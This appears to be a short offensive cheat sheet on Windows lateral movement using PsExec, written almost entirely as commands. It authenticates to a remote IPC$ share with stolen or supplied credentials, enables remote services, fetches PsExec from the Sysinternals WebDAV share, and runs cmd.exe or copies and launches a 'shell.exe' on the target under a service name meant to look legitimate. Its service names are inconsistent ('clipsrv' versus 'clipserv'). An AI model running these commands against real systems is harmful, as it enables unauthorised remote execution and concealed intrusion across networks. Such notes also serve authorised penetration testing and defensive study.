# Living off the Land

Search Tag(s): #lateral-movement #psexec #windows

## 01 - Conditions

It requires specific services to be enabled in order for PsExec to work. Here are the commands to enable it.

```
C:\> net use \\<IP>\IPC$ /user:<username> <password>
sc \\<IP> config netdde start= auto
sc \\<IP> config netddedsdm start= auto
sc \\<IP> config clipsrv start= auto
sc \\<IP> start netdde
sc \\<IP> start netddedsdm
sc \\<IP> start clipserv
```

## 02 - Sysinternals

### 2.1 - Copy File from WebDAV

#### 2.1.1 - Command Prompt

```
C:\> net use z: \\live.sysinternals.com\tools

C:\> copy z:\PsExec64.exe .

C:\> net use z: /delete
```

#### 2.1.2 - Powershell

```
PS C:\> New-PSDrive -Name Z -PSProvider FileSystem -Root "\\live.sysinternals.com\tools"

PS C:\> Copy-Item z:\PsExec64.exe .

PS C:\> Remove-PSDrive -Name Z
```

## 3.2 - Execute PsExec

```
C:\> PsExec64.exe \\<IP> -u <domain>\<username> -p <password> -nobanner -r "A legit service name" cmd.exe

C:\> PsExec64.exe \\<IP> -u <domain>\<username> -p <password> -nobanner -r "A legit service name" -d -c "C:\path\to\shell.exe"

C:\> PsExec64.exe \\<IP> -u <domain>\<username> -p <password> -nobanner -d -c "C:\path\to\shell.exe"
```

---
## References

- [Infinite Logins: Popping Remote Shells with Winexe & PTH-Winexe on Windows](https://infinitelogins.com/2020/09/05/popping-remote-shells-pth-winexe-on-windows/)

- [Abusing Windows Admin Shares (Lateral Movement)](https://www.youtube.com/watch?v=41MUhlHGZ4E)

- [Pass the Hash is Dead Long Live Pass the Hash](https://blog.harmj0y.net/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/)